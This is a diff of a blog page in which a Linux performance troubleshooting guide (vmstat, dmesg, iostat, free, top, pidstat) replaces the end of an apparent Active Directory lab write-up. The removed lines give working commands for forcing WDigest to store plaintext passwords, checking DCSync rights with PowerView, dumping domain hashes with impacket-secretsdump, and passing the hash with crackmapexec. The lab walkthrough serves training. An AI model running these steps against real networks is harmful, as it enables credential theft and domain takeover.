+<ul>
+<li>CPU</li>
+<li>memory</li>
+<li>processes</li>
+<li>I/O</li>
+<li>context switching.</li>
+</ul>
+</li>
+</ul>
+<h3 id="proc">Proc</h3>
+<ul>
+<li><code>r</code> is no. of processes running on CPU and waiting for a turn (doesn&rsquo;t include I/O).</li>
+<li><code>b</code> is blocked (waiting on I/O).</li>
+</ul>
+<h3 id="memory-and-swap">Memory And Swap</h3>
+<ul>
+<li><code>free</code> is free memory that we have in KiloBytes.</li>
+<li><code>These</code> two mostly be 0, if not you are out of memory bro(mostly used when swap devices are configured).</li>
+<li><code>si</code> is swap-in</li>
+<li><code>so</code> is swap-out</li>
+<li><code>swap</code> used (I have used around ~295MB)</li>
+<li><code>buff</code> kernel buffers</li>
+<li><code>cache</code> filesystem cache (yea, very important)</li>
+</ul>
+<h3 id="io">IO</h3>
+<ul>
+<li><code>bi</code> blocks read from disk</li>
+<li><code>bo</code> blocks written</li>
+</ul>
+<h3 id="cpu">Cpu</h3>
+<ul>
+<li><code>us</code> user CPU %</li>
+<li><code>sy</code> kernel CPU %</li>
+<li><code>id</code> idle %</li>
+<li><code>wa</code> waiting on I/O</li>
+<li><code>st</code> stolen (VM)</li>
+<li><code>gu</code> guest (VMs)</li>
+</ul>
+<h3 id="what-can-we-infer-from-this-and-what-to-look-at-1">What can we infer from this and what to look at?</h3>
+<ul>
+<li><code>r</code> &gt; CPU cores → CPU contention</li>
+<li><code>b</code> &gt; 0 → I/O blocking → check disk</li>
+<li><code>si/so</code> &gt; 0 → memory pressure (bad sign)</li>
+<li>High <code>wa</code> → disk bottleneck</li>
+<li>High <code>us</code> → user-space CPU heavy workload</li>
+<li>High <code>sy</code> → kernel/system overhead</li>
+</ul>
+<h2 id="dmesg">dmesg</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; $ sudo dmesg | tail
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   10.707102<span style="color:#f92672">]</span> wlan0: associate with 20:0c:86:47:59:88 <span style="color:#f92672">(</span>try 1/3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   10.711612<span style="color:#f92672">]</span> wlan0: RX AssocResp from 20:0c:86:47:59:88 <span style="color:#f92672">(</span>capab<span style="color:#f92672">=</span>0x411 status<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> aid<span style="color:#f92672">=</span>4<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   10.718726<span style="color:#f92672">]</span> wlan0: associated
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  992.059500<span style="color:#f92672">]</span> Bluetooth: RFCOMM TTY layer initialized
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  992.059508<span style="color:#f92672">]</span> Bluetooth: RFCOMM socket layer initialized
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  992.059511<span style="color:#f92672">]</span> Bluetooth: RFCOMM ver 1.11
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1031.713561<span style="color:#f92672">]</span> input: realme Buds Wireless <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>AVRCP<span style="color:#f92672">)</span> as /devices/virtual/input/input32
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1266.860351<span style="color:#f92672">]</span> warning: <span style="color:#e6db74">`</span>Socket Thread<span style="color:#960050;background-color:#1e0010">&#39;</span> uses wireless extensions which will stop working <span style="color:#66d9ef">for</span> Wi-Fi <span style="color:#ae81ff">7</span> hardware; use nl80211
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>10544.899092<span style="color:#f92672">]</span> nvme nvme0: using unchecked data buffer
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>10544.903147<span style="color:#f92672">]</span> block nvme0n1: No UUID available providing old NGUID
+</span></span></code></pre></div><ul>
+<li><code>dmseg</code> shows the kernel ring buffer, which has mostly informational messages, warnings, errors, sometimes debug logs.</li>
+<li>You could see like:
+<ul>
+<li>Hardware information</li>
+<li>Driver Messages</li>
+<li>FileSystem Events</li>
+<li>If you are on SELinux then security messages</li>
+<li>Kernel Warnings</li>
+</ul>
+</li>
+</ul>
+<h3 id="what-can-we-infer-from-this-and-what-to-look-at-2">What can we infer from this and what to look at?</h3>
 <ul>
 <li>
-<p>We did get the user, but the password is shown as none as you see from the above image, to get the password we have to force WDigest to store credentials in plaintext. We have to modify below registry to achieve that, and we have to reboot, so that we get the cleartext password<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup> :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span style="color:#ae81ff">1</span>
-</span></span></code></pre></div></li>
-</ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD17.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
+<p>Look for:</p>
 <ul>
-<li>After restarting we get the cleartext password :</li>
+<li>Hardware errors (disk, GPU, USB)</li>
+<li>Driver failures</li>
+<li>Filesystem issues</li>
 </ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD18.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 600px;">
-  
-</div>
-
-<h3 id="question-7---what-attack-can-this-user-perform">Question 7 - What attack can this user perform?</h3>
-<ul>
+</li>
 <li>
-<p>I was thinking what could be attack and just casually gave DCsync as an answer and it was correct.. Now we have to find why? for that we can use PowerView<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module .\PowerView.ps1
-</span></span><span style="display:flex;"><span>Get-DomainUser -Identity &lt;user&gt;  |select samaccountname,objectsid,memberof,useraccountcontrol | fl
-</span></span><span style="display:flex;"><span>$sid = <span style="color:#e6db74">&#34;S-1...&#34;</span>
-</span></span><span style="display:flex;"><span>Get-ObjectAcl <span style="color:#e6db74">&#34;DC=inlanefreight,DC=local&#34;</span> -ResolveGUIDs | ? { ($_.ObjectAceType <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#39;Replication-Get&#39;</span>)} | ?{$_.SecurityIdentifier <span style="color:#f92672">-match</span> $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
-</span></span></code></pre></div></li>
+<p>Use:</p>
+</li>
 </ul>
-
-
-
-
-
-<div style="text-align: center; margin: 20px 0;">
-  <img src="/images/AD19.png" alt="Image" 
-       style="border: 0px solid grey; border-radius: 6px; 
-              max-width: 100%; height: auto; 
-              width: 800px;">
-  
-</div>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo dmesg level<span style="color:#f92672">=</span>err,warn
+</span></span></code></pre></div><ul>
+<li>If you see:
 <ul>
-<li>As from the above image we can see that <code>DS-Replication-Get-Changes-In-Filtered-Set</code>, <code>DS-Replication-Get-Changes</code>, <code>DS-Replication-Get-Changes-All</code> are present, which allows user to access replication data from AD database. Thus allowing us to perform DCsync attack.</li>
+<li>Disk errors →  check <code>iostat</code></li>
+<li>OOM killer →  check memory (<code>free</code>, <code>vmstat</code>)</li>
+<li>Repeated warnings →  likely root cause</li>
 </ul>
-<h3 id="question-8---take-over-the-domain-and-submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-on-dc01">Question 8 - Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01</h3>
+</li>
+</ul>
+<h2 id="iostat">iostat</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; $ iostat -xz <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Linux 6.18.16-1-lts <span style="color:#f92672">(</span>vv<span style="color:#f92672">)</span> 	04/22/2026 	_x86_64_	<span style="color:#f92672">(</span><span style="color:#ae81ff">12</span> CPU<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>avg-cpu:  %user   %nice %system %iowait  %steal   %idle
+</span></span><span style="display:flex;"><span>           7.89    0.00    0.97    0.10    0.00   91.04
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Device            r/s     rkB/s   rrqm/s  %rrqm r_await rareq-sz     w/s     wkB/s   wrqm/s  %wrqm w_await wareq-sz     d/s     dkB/s   drqm/s  %drqm d_await dareq-sz     f/s f_await  aqu-sz  %util
+</span></span><span style="display:flex;"><span>loop0            0.00      0.07     0.00   0.00    0.04    14.57    0.00      0.00     0.00   0.00    0.00     0.00    0.00      0.00     0.00   0.00    0.00     0.00    0.00    0.00    0.00   0.00
+</span></span><span style="display:flex;"><span>nvme0n1         18.64    345.87     7.12  27.64    0.19    18.55    9.90    282.46    11.42  53.56    3.12    28.52    0.00      0.00     0.00   0.00    0.00     0.00    1.06    1.90    0.04   1.26
+</span></span><span style="display:flex;"><span>zram0            0.01      0.12     0.00   0.00    0.00    16.46    0.00      0.00     0.00   0.00    0.00     4.00    0.00      0.00     0.00   0.00    0.00     0.00    0.00    0.00    0.00   0.00
+</span></span></code></pre></div><ul>
+<li>
+<p>iostat is used to show I/O metrics.</p>
+</li>
+<li>
+<p>Options:</p>
 <ul>
-<li>
-<p>We can use Runas to login as t***** user, now let&rsquo;s just dump the hashes of <code>Administrator</code> using impacket-secretsdump, we can get DC01 IP, by pinging it like we did it before:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/&lt;user&gt;@&lt;ip&gt;
-</span></span></code></pre></div></li>
-<li>
-<p>Now that we got the hash, we can <code>pass the hash</code> using crackmapexec and get the final flag!!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains crackmapexec smb &lt;ip&gt; -u Administrator -H &lt;hash&gt; -x <span style="color:#e6db74">&#39;type C:\Users\Administrator\Desktop\flag.txt&#39;</span>
-</span></span></code></pre></div></li>
+<li><code>x</code> = extended stats</li>
+<li><code>z</code> = hide idle devices</li>
+<li><code>1</code> = refresh every second</li>
 </ul>
-<div class="footnotes" role="doc-endnotes">
-<hr>
+</li>
+</ul>
+<h3 id="key-fields">Key Fields</h3>
+<ul>
+<li><code>r/s, w/s, rkB/s, and wkB/s</code> are the delivered reads, writes, read Kbytes, and write Kbytes.</li>
+<li><code>user</code> CPU time running user-space programs</li>
+<li><code>nice</code> user processes with modified priority (nice)</li>
+<li><code>system</code> kernel work (syscalls, interrupts, etc.)</li>
+<li><code>iowait</code> CPU waiting for disk I/O</li>
+<li><code>steal</code> time stolen by hypervisor (VMs)</li>
+<li><code>aqu-sz</code> average queue size</li>
+</ul>
+<h3 id="what-can-we-infer-from-this-and-what-to-look-at-3">What can we infer from this and what to look at?</h3>
+<ul>
+<li><code>%util</code> ~100% →  disk saturated</li>
+<li>High <code>await</code> (&gt;10–20ms SSD, &gt;50ms HDD) →  latency issue</li>
+<li>High <code>aqu-sz</code> →  queue buildup</li>
+<li>Low util but high await →  possible driver/fs issue</li>
+<li>High writes →  check logs, journaling, apps</li>
+</ul>
+<h2 id="free">free</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; $ free -h
+</span></span><span style="display:flex;"><span>               total        used        free      shared  buff/cache   available
+</span></span><span style="display:flex;"><span>Mem:            15Gi       4.9Gi       5.4Gi       308Mi       5.6Gi        10Gi
+</span></span><span style="display:flex;"><span>Swap:          7.7Gi          0B       7.7Gi
+</span></span></code></pre></div><h3 id="what-can-we-infer-from-this-and-what-to-look-at-4">What can we infer from this and what to look at?</h3>
+<ul>
+<li>Focus on <code>available</code>, not <code>free</code></li>
+<li>Low available memory →  pressure</li>
+<li>High swap usage + growing →  is a bad sign</li>
+<li>High cache is GOOD (Linux uses memory efficiently)</li>
+<li>If swapping:
+<ul>
+<li>Check <code>vmstat</code></li>
+<li>Identify heavy processes (<code>top</code>, <code>pidstat</code>)</li>
+</ul>
+</li>
+</ul>
+<h2 id="top">top</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>top - 12:39:27 up  3:19,  <span style="color:#ae81ff">1</span> user,  load average: 1.71, 1.38, 1.30
+</span></span><span style="display:flex;"><span>Tasks: <span style="color:#ae81ff">345</span> total, <span style="color:#ae81ff">3</span> running, <span style="color:#ae81ff">339</span> sleep, <span style="color:#ae81ff">0</span> d-sleep, <span style="color:#ae81ff">0</span> stopped, <span style="color:#ae81ff">3</span> zombie
+</span></span><span style="display:flex;"><span>%Cpu<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>: 10.2 us,  0.7 sy,  0.0 ni, 88.9 id,  0.0 wa,  0.2 hi,  0.1 si,  0.0 st
+</span></span><span style="display:flex;"><span>MiB Mem :  15684.2 total,   5625.4 free,   4921.3 used,   5763.8 buff/cache
+</span></span><span style="display:flex;"><span>MiB Swap:   7842.0 total,   7842.0 free,      0.0 used.  10762.9 avail Mem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">70437</span> vamsi     <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">2677100</span> <span style="color:#ae81ff">269184</span> <span style="color:#ae81ff">207060</span> R  88.5   1.7   0:41.27 alacritty
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1724</span> sddm      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">3242032</span> <span style="color:#ae81ff">390572</span> <span style="color:#ae81ff">111668</span> S  20.3   2.4  39:12.91 sddm-greeter-qt
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2006</span> vamsi     <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>   25.2g <span style="color:#ae81ff">441924</span> <span style="color:#ae81ff">408932</span> R  10.3   2.8   8:50.27 Xorg
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2435</span> vamsi     <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">2667188</span> <span style="color:#ae81ff">244772</span> <span style="color:#ae81ff">163784</span> S   6.0   1.5  18:40.36 alacritty
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">49158</span> vamsi     <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">2666860</span> <span style="color:#ae81ff">281160</span> <span style="color:#ae81ff">202704</span> S   1.7   1.8   0:07.98 alacritty
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">921</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">3090444</span> <span style="color:#ae81ff">111104</span>  <span style="color:#ae81ff">79396</span> S   0.7   0.7   2:14.21 opensnitchd
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">82014</span> vamsi     <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">11140</span>   <span style="color:#ae81ff">8108</span>   <span style="color:#ae81ff">5812</span> R   0.7   0.1   0:00.05 top
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">106</span> root     -51   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> S   0.3   0.0   0:14.27 irq/9-acpi
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2034</span> vamsi     <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">128376</span>  <span style="color:#ae81ff">28972</span>  <span style="color:#ae81ff">21728</span> S   0.3   0.2   0:03.41 i3bar
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2305</span> vamsi     <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1582668</span>  <span style="color:#ae81ff">77056</span>  <span style="color:#ae81ff">48636</span> S   0.3   0.5   0:08.00 blueman-tray
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4139</span> vamsi     <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">583744</span>  <span style="color:#ae81ff">28100</span>  <span style="color:#ae81ff">10432</span> S   0.3   0.2   1:06.48 btop
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">78677</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> I   0.3   0.0   0:00.24 kworker/u48:2-i915
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">1</span> root      <span style="color:#ae81ff">20</span>   <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">23312</span>  <span style="color:#ae81ff">14100</span>   <span style="color:#ae81ff">9764</span> S   0.0   0.1   0:02.14 systemd
+</span></span></code></pre></div><h3 id="what-can-we-infer-from-this-and-what-to-look-at-5">What can we infer from this and what to look at?</h3>
+<ul>
+<li>Identify top CPU consumers</li>
+<li>Look for:
+<ul>
+<li>Runaway processes</li>
+<li>Zombies</li>
+<li>High memory users</li>
+</ul>
+</li>
+<li>CPU breakdown:
+<ul>
+<li>High <code>us</code> →  apps</li>
+<li>High <code>sy</code> →  kernel</li>
+<li>High <code>wa</code> →  disk wait</li>
+</ul>
+</li>
+</ul>
+<h2 id="mpstat">mpstat</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mpstat -P ALL <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="what-can-we-infer-from-this-and-what-to-look-at-6">What can we infer from this and what to look at?</h3>
+<ul>
+<li>Per-core CPU usage</li>
+<li>Detect:
+<ul>
+<li>Single-core bottleneck (one core at 100%)</li>
+<li>Imbalanced workloads</li>
+</ul>
+</li>
+<li>High <code>%iowait</code> → disk issue</li>
+<li>Useful for:
+<ul>
+<li>Multi-threading issues</li>
+<li>CPU pinning problems</li>
+</ul>
+</li>
+</ul>
+<h2 id="pidstat">pidstat</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; $ pidstat <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Linux 6.18.16-1-lts <span style="color:#f92672">(</span>vv<span style="color:#f92672">)</span> 	04/22/2026 	_x86_64_	<span style="color:#f92672">(</span><span style="color:#ae81ff">12</span> CPU<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>12:41:02 PM   UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
+</span></span><span style="display:flex;"><span>12:41:03 PM     <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">921</span>    0.00    0.99    0.00    0.00    0.99     <span style="color:#ae81ff">3</span>  opensnitchd
+</span></span><span style="display:flex;"><span>12:41:03 PM   <span style="color:#ae81ff">965</span>      <span style="color:#ae81ff">1724</span>   19.80    0.00    0.00    0.00   19.80     <span style="color:#ae81ff">3</span>  sddm-greeter-qt
+</span></span><span style="display:flex;"><span>12:41:03 PM  <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">2006</span>    0.99    0.00    0.00    0.00    0.99     <span style="color:#ae81ff">9</span>  Xorg
+</span></span><span style="display:flex;"><span>12:41:03 PM  <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">2435</span>    8.91    0.00    0.00    0.00    8.91     <span style="color:#ae81ff">6</span>  alacritty
+</span></span><span style="display:flex;"><span>12:41:03 PM  <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">2667</span>    1.98    0.99    0.00    0.00    2.97     <span style="color:#ae81ff">2</span>  zen
+</span></span><span style="display:flex;"><span>12:41:03 PM  <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">4139</span>    0.99    0.00    0.00    0.00    0.99     <span style="color:#ae81ff">4</span>  btop
+</span></span></code></pre></div><h3 id="what-can-we-infer-from-this-and-what-to-look-at-7">What can we infer from this and what to look at?</h3>
+<ul>
+<li>Per-process breakdown over time</li>
+<li>Identify:
+<ul>
+<li>CPU-heavy processes</li>
+<li>Processes waiting on I/O (<code>%wait</code>)</li>
+</ul>
+</li>
+<li>This is better than <code>top</code> for trends</li>
+<li>Use when:
+<ul>
+<li>Issue is intermittent</li>
+<li>Need per-process historical view</li>
+</ul>
+</li>
+</ul>
+<h1 id="final-thoughts">Final Thoughts</h1>
+<p>A quick workflow:</p>
 <ol>
-<li id="fn:1">
-<p><a href="https://academy.hackthebox.com/module/143/section/1423"  target="_blank" rel="noreferrer nofollow">Kerberoasting - from Windows</a>
-&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:2">
-<p><a href="https://academy.hackthebox.com/module/143/section/1423"  target="_blank" rel="noreferrer nofollow">Using PowerView to Target a Specific User</a>
-&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:3">
-<p><a href="https://academy.hackthebox.com/module/143/section/1275"  target="_blank" rel="noreferrer nofollow">Establishing WinRM Session from Windows</a>
-&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:4">
-<p><a href="https://linuxcommandlibrary.com/man/xfreerdp"  target="_blank" rel="noreferrer nofollow">Connect to a FreeRDP server with a shared directory</a>
-&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:5">
-<p><a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext"  target="_blank" rel="noreferrer nofollow">Forcing WDigest to Store Credentials in Plaintext</a>
-&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-<li id="fn:6">
-<p><a href="https://academy.hackthebox.com/module/143/section/1489"  target="_blank" rel="noreferrer nofollow">Using Get-DomainUser to View a User Group Membership</a>
-&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
+<li><code>uptime</code> →  is load high?</li>
+<li><code>vmstat</code> →  CPU vs memory vs I/O?</li>
+<li><code>iostat</code> →  disk bottleneck?</li>
+<li><code>top</code> / <code>pidstat</code> →  which process?</li>
+<li><code>dmesg</code> →  any kernel-level issues?</li>
 </ol>
-</div>
+<p>More advanced tools later 🙂</p>
 </main>
 
 
